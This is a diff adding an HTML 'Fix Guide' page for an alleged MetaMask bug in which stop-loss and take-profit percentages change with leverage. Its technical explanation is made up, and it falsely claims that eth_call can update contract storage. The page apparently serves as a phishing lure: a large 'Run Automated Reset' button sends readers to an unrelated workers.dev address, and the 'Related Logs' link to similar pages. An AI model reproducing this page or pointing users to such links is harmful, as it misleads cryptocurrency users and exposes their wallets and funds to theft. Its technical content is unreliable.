@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Sl Tp Percentages Change When Changing L – Fix Guide</title>
+<style>
+    body {
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff7b2c; }
+    .btn {
+        background: #00adb5;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Sl Tp Percentages Change When Changing L</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem notice that their Stop-Loss (SL) and Take-Profit (TP) percentages are altered when they modify the leverage settings, despite no intentional changes being made to these parameters.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The issue arises due to an incorrect handling of decimal places and percentage calculations within the Metamask extension's code when leverage is adjusted, leading to unintended modifications of the SL and TP values.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To manually correct the SL and TP percentages, users can attempt the following overrides:</li>
+<li>Directly edit the JSON configuration file associated with their Metamask extension settings.</li>
+<li>Utilize the <code>eth_call</code> method to update the contract's storage variables directly, which might require advanced technical knowledge.</li>
+<li>Execute a script that recalculates and sets the correct SL and TP percentages based on the user's desired leverage, as shown in the example below:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_call&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;data&quot;:&quot;0x...&quot;}],&quot;id&quot;:1}&#39;</span>
+</code></pre></div>
+
+<p>Prerequisites:
+- Basic understanding of Ethereum smart contract interactions
+- Familiarity with JSON data format
+- Access to a local Ethereum node or a third-party provider</p>
+<p>For more complex adjustments, consider accessing the extension's settings through an external console for finer control over the configuration parameters.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
